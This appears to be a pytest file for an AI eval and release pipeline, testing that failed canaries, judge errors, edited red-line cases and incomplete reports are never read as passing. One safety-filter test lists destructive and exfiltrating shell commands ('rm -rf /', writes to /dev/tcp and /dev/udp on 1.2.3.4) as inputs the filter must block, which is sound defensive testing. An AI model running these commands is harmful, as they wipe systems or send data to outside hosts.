"""A check that failed must never read as passed (fixing spec 2026-10-28, group C).

Each test injects one kind of failure at one reader of an eval result and asks: does
that reader still say "passed"? Sites: the post-deploy canary (C1), the scheduled
alert on judge collapse (C2), the release decision on an edited red-line case (C3),
the release gate on a report without negatives (C4), stable promotion of an edited
user case (C5), and the session canary on a timeout (C6).
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.eval_release import decide_release  # noqa: E402
from scripts import eval_runner as er  # noqa: E402
from scripts.canary_check import canary_problem  # noqa: E402
from scripts.golden_case_validator import compute_case_stamp  # noqa: E402


def _stamped(case: dict) -> dict:
    case = dict(case)
    case["validated_by_4gate"] = compute_case_stamp(case)
    return case


_RECORD_OK = {"status": "completed",
              "bvt": {"total": 36, "passed": 36, "failed": 0, "error": 0, "timeout": 0, "green": True},
              "redline": {"violated": False, "total": 6, "violations": []}}


# ── C1: the post-deploy canary ────────────────────────────────────────────────

def test_canary_passes_only_on_green_bvt_and_no_redline():
    assert canary_problem(_RECORD_OK) is None


@pytest.mark.parametrize("record", [
    {**_RECORD_OK, "bvt": {**_RECORD_OK["bvt"], "failed": 1, "green": False}},
    {**_RECORD_OK, "bvt": {**_RECORD_OK["bvt"], "timeout": 2, "green": False}},
    {**_RECORD_OK, "redline": {"violated": True, "violations": [{"id": "SAFE_X"}]}},
    {"status": "completed"},                    # the old reader's only field
    {"detail": "Internal Server Error"},        # an error body
    "<html>502</html>",
    None,
])
def test_canary_failure_is_never_a_pass(record):
    assert canary_problem(record)


def test_canary_check_cli_fails_on_non_json(tmp_path):
    import subprocess
    script = Path(__file__).resolve().parents[1] / "scripts" / "canary_check.py"
    bad = subprocess.run([sys.executable, str(script)], input="not json", text=True,
                         capture_output=True)
    good = subprocess.run([sys.executable, str(script)], input=json.dumps(_RECORD_OK),
                          text=True, capture_output=True)
    assert bad.returncode == 1 and bad.stdout.strip()
    assert good.returncode == 0


def _run_prod_canary(tmp_path, curl_rc: int, body: str) -> tuple[int, str]:
    """Run prod.sh's _post_deploy_canary under ``set -e`` with curl stubbed."""
    import subprocess
    repo = Path(__file__).resolve().parents[2]
    fn = subprocess.run(["sed", "-n", "/^_post_deploy_canary() {/,/^}/p", str(repo / "prod.sh")],
                        capture_output=True, text=True, check=True).stdout
    assert fn.strip(), "prod.sh has no _post_deploy_canary"
    (tmp_path / "body.json").write_text(body)
    script = f"""set -e
PROJECT_ROOT={repo}
_log() {{ :; }}; _ok() {{ echo "OK $*"; }}; _warn() {{ echo "WARN $*"; }}
curl() {{ cat {tmp_path / "body.json"}; return {curl_rc}; }}
{fn}
_post_deploy_canary
echo "after rc=$?"
"""
    r = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
    return r.returncode, r.stdout


def test_prod_canary_failure_warns_and_does_not_abort_the_deploy(tmp_path):
    bad = {**_RECORD_OK, "bvt": {**_RECORD_OK["bvt"], "failed": 1, "green": False}}
    rc, out = _run_prod_canary(tmp_path, 0, json.dumps(bad))
    assert rc == 0 and "WARN Eval canary FAILED" in out and "BVT not green" in out
    assert "after rc=0" in out


def test_prod_canary_http_error_warns_and_does_not_abort(tmp_path):
    rc, out = _run_prod_canary(tmp_path, 22, "")
    assert rc == 0 and "request failed (curl exit 22)" in out and "after rc=0" in out


def test_prod_canary_pass(tmp_path):
    rc, out = _run_prod_canary(tmp_path, 0, json.dumps(_RECORD_OK))
    assert rc == 0 and "OK Eval canary passed" in out


# ── C2: judge collapse alerts, spawn flakes do not ────────────────────────────

@pytest.fixture
def _alert_state(tmp_path, monkeypatch):
    import jobs.handlers.eval_scheduled as mod
    monkeypatch.setattr(mod, "_ALERT_STATE", tmp_path / ".alert.json")
    monkeypatch.setattr(mod, "_BIWEEKLY_STATE", tmp_path / ".biweekly.json")
    return mod


def _behavior(i, status, **extra):
    return {"id": f"B{i}", "eval_method": "behavior", "status": status, **extra}


def test_judged_cases_that_passed_do_not_alert(tmp_path, _alert_state):
    cases = [_behavior(i, "passed", judged=True) for i in range(10)]
    r = _alert_state.run_eval_scheduled(
        runner=lambda root: {"this": {"release": {"verdict": "release", "checks": []},
                                      "cases": cases}},
        notifier=lambda **kw: None, root=tmp_path)
    assert not any("judge unavailable" in x for x in r["reasons"])


def test_judge_collapse_on_behavior_cases_alerts(tmp_path, _alert_state):
    release = decide_release([], [])
    cases = [_behavior(i, "error", judged=True) for i in range(10)]
    sent = []
    r = _alert_state.run_eval_scheduled(
        runner=lambda root: {"this": {"release": {**release, "verdict": "release"}, "cases": cases}},
        notifier=lambda **kw: sent.append(kw), root=tmp_path)
    assert any("judge unavailable" in x for x in r["reasons"]), r["reasons"]
    assert len(sent) == 1


def test_behavior_spawn_failures_are_not_a_judge_alert(tmp_path, _alert_state):
    cases = [_behavior(i, "error") for i in range(10)]  # agent never started: no judge
    r = _alert_state.run_eval_scheduled(
        runner=lambda root: {"this": {"release": {"verdict": "release", "checks": []},
                                      "cases": cases}},
        notifier=lambda **kw: None, root=tmp_path)
    assert not any("judge unavailable" in x for x in r["reasons"])


def test_a_skipped_llm_case_is_not_judged(monkeypatch, tmp_path):
    monkeypatch.setattr(er, "eval_llm_judge",
                        lambda case, ev: {"status": "skipped", "notes": "Empty scenario input"})
    r = er.evaluate_case({"id": "L", "eval_method": "llm", "evaluators": ["goal_success"]}, tmp_path)
    assert "judged" not in r


def test_judge_alert_ids_stay_out_of_the_fingerprint(tmp_path, _alert_state):
    def run(ids):
        _alert_state._BIWEEKLY_STATE.unlink(missing_ok=True)  # each call is a due run
        cases = [_behavior(i, "error", judged=True) for i in ids]
        return _alert_state.run_eval_scheduled(
            runner=lambda root: {"this": {"release": {"verdict": "release", "checks": []},
                                          "cases": cases}},
            notifier=lambda **kw: None, root=tmp_path)
    assert run(range(5))["reasons"] == run(range(5, 12))["reasons"]


def test_llm_judge_error_is_tagged(monkeypatch, tmp_path):
    monkeypatch.setattr(er, "eval_llm_judge",
                        lambda case, ev: {"status": "error", "notes": "Judge call failed: creds"})
    r = er.evaluate_case({"id": "L", "eval_method": "llm", "evaluators": ["goal_success"]}, tmp_path)
    assert r["judged"] is True and r["status"] == "error"


def test_decision_judge_error_is_tagged(monkeypatch):
    from scripts import scenario_runner as sr

    stdout = "\n".join([
        json.dumps({"type": "assistant", "message": {"role": "assistant", "content": [
            {"type": "tool_use", "id": "t1", "name": "Grep", "input": {"pattern": "port"}}]}}),
        json.dumps({"type": "result", "result": "answer"}),
    ])
    monkeypatch.setattr("scripts.scenario_runner.run_scenario_raw",
                        lambda prompt, **kw: (sr.parse_trajectory(stdout), sr.parse_final_text(stdout), stdout))
    monkeypatch.setattr(er, "_judge_decision_direction",
                        lambda case, text: {"status": "error", "notes": "decision judge call failed"})
    r = er.eval_trajectory_capture({"id": "B", "eval_method": "behavior",
                                    "scenario": {"prompt": "find the port"},
                                    "expected_trajectory": ["Grep port"],
                                    "decision_rubric": "says the port"})
    assert r["status"] == "error" and r["judged"] is True


def test_run_record_keeps_judged(monkeypatch, tmp_path):
    monkeypatch.setattr(er, "evaluate_case", lambda case, root, **kw: {
        "status": "error", "judged": True, "duration_ms": 1})
    monkeypatch.setattr(er, "compute_code_digest", lambda root: "d")
    rec = er.run_eval({"cases": [{"id": "L", "eval_method": "llm"}]}, "manual", None, tmp_path)
    assert rec["cases"][0]["judged"] is True


# ── C3: an edited red-line case does not keep deciding the release ────────────

def test_stale_redline_case_makes_the_release_incomplete():
    red = _stamped({"id": "R", "redline": True, "dimension": "safety",
                    "eval_method": "programmatic", "evaluators": ["canary_pass"]})
    red["notes_edited"] = "changed outside the validator"
    rel = decide_release([red], [{"id": "R", "status": "passed"}])
    assert rel["verdict"] == "incomplete"
    assert {"id": "R", "status": "stale_stamp"} in rel["checks"][2]["cases"]


def test_never_stamped_redline_case_is_named_unstamped():
    red = {"id": "R0", "redline": True, "dimension": "safety", "eval_method": "programmatic",
           "evaluators": ["canary_pass"]}
    rel = decide_release([red], [{"id": "R0", "status": "passed"}])
    assert rel["verdict"] == "incomplete"
    assert {"id": "R0", "status": "unstamped"} in rel["checks"][2]["cases"]


# ── C4: the gate needs a report whose negatives ran; newest by trigger time ───

def _write(hist: Path, name: str, report: dict, mtime: float):
    import os
    p = hist / name
    p.write_text(json.dumps(report))
    os.utime(p, (mtime, mtime))


def test_gate_refuses_a_report_without_negatives(tmp_path, monkeypatch):
    import scripts.ci_eval_gate as gate
    monkeypatch.setattr(gate, "compute_code_digest", lambda root: "d")
    hist = er._eval_history_dir(tmp_path)
    hist.mkdir(parents=True, exist_ok=True)
    _write(hist, "a.json", {"code_digest": "d", "bvt": {"green": True, "total": 1},
                            "redline": {"violated": False}, "negatives_ran": False,
                            "triggered_at": "2026-10-28T00:00:00+00:00"}, 1000)
    code, msg = gate.check_gate(tmp_path)
    assert code == 2 and "negative" in msg


def _strong(**kw):
    rep = {"code_digest": "d", "bvt": {"green": True, "total": 1, "passed": 1},
           "redline": {"violated": False}, "negatives_ran": True,
           "release": {"verdict": "release"}, "cases": [],
           "triggered_at": "2026-10-28T01:00:00+00:00", "triggered_by": "manual"}
    rep.update(kw)
    return rep


def test_gate_decides_on_the_full_run_under_a_newer_canary(tmp_path, monkeypatch):
    import scripts.ci_eval_gate as gate
    monkeypatch.setattr(gate, "compute_code_digest", lambda root: "d")
    monkeypatch.setattr("scripts.eval_runner.load_merged_golden_set", lambda root: {"cases": []})
    hist = er._eval_history_dir(tmp_path)
    hist.mkdir(parents=True, exist_ok=True)
    _write(hist, "full.json", _strong(), 1000)
    _write(hist, "canary.json", _strong(negatives_ran=False, triggered_by="canary",
                                        triggered_at="2026-10-28T02:00:00+00:00"), 2000)
    code, msg = gate.check_gate(tmp_path)
    assert code == 0, msg


def test_a_newer_canary_on_the_same_code_still_vetoes(tmp_path, monkeypatch):
    import scripts.ci_eval_gate as gate
    monkeypatch.setattr(gate, "compute_code_digest", lambda root: "d")
    hist = er._eval_history_dir(tmp_path)
    hist.mkdir(parents=True, exist_ok=True)
    _write(hist, "full.json", _strong(), 1000)
    _write(hist, "canary.json", _strong(negatives_ran=False, triggered_by="canary",
                                        triggered_at="2026-10-28T02:00:00+00:00",
                                        bvt={"green": False, "failed": 1}), 2000)
    code, msg = gate.check_gate(tmp_path)
    assert code == 1 and "newer run" in msg


def test_gate_orders_a_naive_time_as_utc_and_a_missing_one_last():
    import scripts.ci_eval_gate as gate
    assert gate._trigger_time({"triggered_at": "2026-10-28T01:00:00"}) == \
        gate._trigger_time({"triggered_at": "2026-10-28T01:00:00+00:00"})
    assert gate._trigger_time({}) == float("-inf")


def test_gate_takes_the_newest_by_trigger_time_not_mtime(tmp_path):
    import scripts.ci_eval_gate as gate
    hist = er._eval_history_dir(tmp_path)
    hist.mkdir(parents=True, exist_ok=True)
    _write(hist, "old.json", {"run_id": "old", "triggered_at": "2026-10-01T00:00:00+00:00"}, 2000)
    _write(hist, "new.json", {"run_id": "new", "triggered_at": "2026-10-20T00:00:00+00:00"}, 1000)
    assert gate._latest_report(tmp_path)["run_id"] == "new"


def test_run_record_says_whether_negatives_ran(monkeypatch, tmp_path):
    monkeypatch.setattr(er, "evaluate_case", lambda case, root, **kw: {"status": "passed", "duration_ms": 1})
    monkeypatch.setattr(er, "compute_code_digest", lambda root: "d")
    on = er.run_eval({"cases": [{"id": "A"}]}, "manual", None, tmp_path, verify_teeth=True)
    off = er.run_eval({"cases": [{"id": "A"}]}, "canary", None, tmp_path)
    assert on["negatives_ran"] is True and off["negatives_ran"] is False


# ── C5: promotion re-stamps a current case and leaves an edited one alone ─────

class _Svc:
    """Just the parts of EvalService that promote_stable_cases touches."""

    def __init__(self, cases, passes):
        import threading
        self._cases, self._passes = cases, passes
        self._data_lock = threading.RLock()
        self.persisted = 0

    def _count_consecutive_passes(self, case_id):
        return self._passes

    def _persist_golden_set(self):
        self.persisted += 1


def _user_case(cid):
    return _stamped({"id": cid, "tier": "active", "gating": "gate", "dimension": "cognition",
                     "eval_method": "programmatic", "evaluators": ["canary_pass"],
                     "_origin": "private"})


def test_promotion_keeps_a_current_case_in_the_bvt():
    from core.eval_service import EvalService
    case = _user_case("U1")
    svc = _Svc([case], passes=10)
    assert EvalService.promote_stable_cases(svc) == ["U1"]
    assert case["tier"] == "stable" and er.bvt_member(case)


def test_promotion_does_not_reapprove_an_edited_case():
    from core.eval_service import EvalService
    case = _user_case("U2")
    case["verification"] = {"command": "edited outside the validator"}
    svc = _Svc([case], passes=10)
    assert EvalService.promote_stable_cases(svc) == []
    assert case["tier"] == "active"
    assert case["validated_by_4gate"] != compute_case_stamp(case)


def test_promotion_of_an_unstamped_case_does_not_stamp_it():
    from core.eval_service import EvalService
    case = {"id": "U3", "tier": "active", "eval_method": "programmatic",
            "evaluators": ["canary_pass"], "_origin": "private"}
    svc = _Svc([case], passes=10)
    assert EvalService.promote_stable_cases(svc) == ["U3"]
    assert case["tier"] == "stable" and "validated_by_4gate" not in case


# ── C6: the session canary counts a timeout ───────────────────────────────────

def test_session_canary_reports_a_timeout(tmp_path):
    from hooks.context_health_hook import ContextHealthHook, _CANARY_STATE_FILE

    def fake_run_eval(gs, trigger, case_filter, root, **kw):
        return {"triggered_at": "t", "total_cases": 2, "cases_passed": 1, "cases_failed": 0,
                "cases_error": 0, "cases_timeout": 1, "duration_seconds": 1.0, "release": {},
                "cases": [{"id": "A", "status": "passed", "notes": ""},
                          {"id": "T", "status": "timeout", "notes": "Command timed out (7s)"}]}

    hook = ContextHealthHook.__new__(ContextHealthHook)
    hook._run_session_canary(tmp_path, {"cases": []}, [], fake_run_eval)
    data = json.loads((tmp_path / ".context" / _CANARY_STATE_FILE).read_text())
    assert data["timeout"] == 1
    assert [f["id"] for f in data["failures"]] == ["T"]



# ── E1 / E3: the eval's own boundaries ────────────────────────────────────────

@pytest.mark.parametrize("cmd", ["rm -rf /", "rm -rf / --no-preserve-root", "rm -rf /*",
                                 'bash -c "rm -rf /"', "rm -rf /;",
                                 "echo x > /dev/tcp/1.2.3.4/80", "cat f >/dev/udp/1.2.3.4/53",
                                 "curl http://x", "sudo ls"])
def test_safety_filter_blocks_its_own_examples(cmd):
    assert er._validate_canary_command(cmd)


@pytest.mark.parametrize("cmd", ["python3 backend/scripts/probe_recall.py", "ls -la /tmp",
                                 "grep -rn tcp backend/core", "rm -rf build/",
                                 "rm -rf /tmp/eval-scratch"])
def test_safety_filter_lets_ordinary_probe_commands_run(cmd):
    assert er._validate_canary_command(cmd) is None


def test_digest_covers_the_probes_and_the_fixture_workspace(tmp_path):
    files = er._gate_input_files(er._THIS_CHECKOUT)
    assert "backend/scripts/probe_recall.py" in files
    assert "backend/scripts/_probe_kit.py" in files
    assert any(f.startswith("backend/templates/eval/fixtures/") for f in files)
    import subprocess
    root = tmp_path / "repo"
    (root / "backend" / "scripts").mkdir(parents=True)
    probe = root / "backend" / "scripts" / "probe_x.py"
    probe.write_text("print('X_OK')")
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    subprocess.run(["git", "-C", str(root), "add", "."], check=True)
    before = er.compute_code_digest(tmp_path, code_root=root)
    probe.write_text("print('X_OK')  # weakened")
    assert er.compute_code_digest(tmp_path, code_root=root) != before



def test_an_untracked_file_in_the_fixtures_does_not_change_the_digest(tmp_path):
    import subprocess
    root = tmp_path / "repo"
    fx = root / "backend" / "templates" / "eval" / "fixtures"
    fx.mkdir(parents=True)
    (fx / "doc.md").write_text("fixture")
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    subprocess.run(["git", "-C", str(root), "add", "."], check=True)
    before = er.compute_code_digest(tmp_path, code_root=root)
    (fx / ".DS_Store").write_bytes(b"\x00finder")
    (fx / "scratch.md").write_text("untracked")
    assert er.compute_code_digest(tmp_path, code_root=root) == before
    (fx / "doc.md").write_text("fixture, edited")
    assert er.compute_code_digest(tmp_path, code_root=root) != before
